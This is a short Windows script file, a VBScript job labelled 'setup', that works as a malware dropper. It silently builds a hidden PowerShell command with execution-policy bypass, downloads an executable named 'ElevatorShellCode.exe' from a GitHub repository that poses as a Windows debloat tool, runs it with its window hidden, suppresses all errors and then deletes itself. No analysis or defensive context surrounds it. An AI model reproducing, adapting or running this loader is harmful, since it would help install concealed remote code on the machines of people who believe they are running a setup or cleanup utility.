<job id="setup">
  <script language="VBScript">
    On Error Resume Next
    Dim shell, fso, tempPath, exePath, url, psCmd

    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")

    tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
    exePath = tempPath & "\es.exe"
    url = "https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/ElevatorShellCode.exe"

    psCmd = "powershell -ep bypass -w hidden -c ""$e='" & exePath & "'; $u='" & url & "'; try { $w = New-Object Net.WebClient; $w.DownloadFile($u,$e); Start-Process $e -WindowStyle Hidden } catch {}"""

    shell.Run psCmd, 0, False

    fso.DeleteFile WScript.ScriptFullName, True
  </script>
</job>
